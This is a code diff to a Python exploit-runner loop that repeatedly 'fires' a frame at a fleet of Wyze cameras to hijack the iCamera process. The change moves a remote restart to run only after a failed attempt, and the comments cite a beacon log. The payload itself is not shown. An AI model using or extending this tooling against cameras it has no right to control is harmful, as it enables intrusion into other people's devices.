@@ -482,20 +482,24 @@ def loop_watch(a: argparse.Namespace, cmd: bytes) -> int:
                 print(f"{ip}: no cfg in {CFG_DIR}, cannot fire", flush=True)
                 retry_at[ip] = time.time() + RETRY_COOLDOWN
                 continue
-            # ask the camera to restart iCamera first: MQTT still works when the shell
-            # path is wedged, and a restart is what clears a soft wedge. The frame below
-            # then re-writes the config. Cheap, and independent of exec_shell_sync.
-            pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wyze_cmd.py")
-            if os.path.exists(pub):
-                subprocess.run([sys.executable, pub, "restart", cfg[2]],
-                               capture_output=True, text=True, timeout=60, check=False)
-                print(f"{ip}: restartprocess sent", flush=True)
+            # Fire FIRST, restart only after a failure. The frame has to land in the
+            # iCamera that is already running and warm: restarting it beforehand tears
+            # down exactly the parser state the hijack needs, and the beacon log showed
+            # no execution at all while restart-before-fire was in place (2026-11-13).
             listened, status = fire(ip, *cfg, a, cmd)
             if listened and status == 200:
                 retired.add(ip)
                 retry_at.pop(ip, None)
                 print(f"{ip}: serving with fssuser", flush=True)
             else:
+                # the fire did not take: MQTT still works when the shell path is wedged,
+                # and restartprocess is what clears a soft wedge, so try it now for the
+                # NEXT cycle instead of spending this one on it.
+                pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wyze_cmd.py")
+                if os.path.exists(pub):
+                    subprocess.run([sys.executable, pub, "restart", cfg[2]],
+                                   capture_output=True, text=True, timeout=60, check=False)
+                    print(f"{ip}: restartprocess sent after the failed fire", flush=True)
                 retry_at[ip] = time.time() + RETRY_COOLDOWN
                 print(f"{ip}: not serving — retry in {RETRY_COOLDOWN}s", flush=True)
         time.sleep(FLEET_INTERVAL)
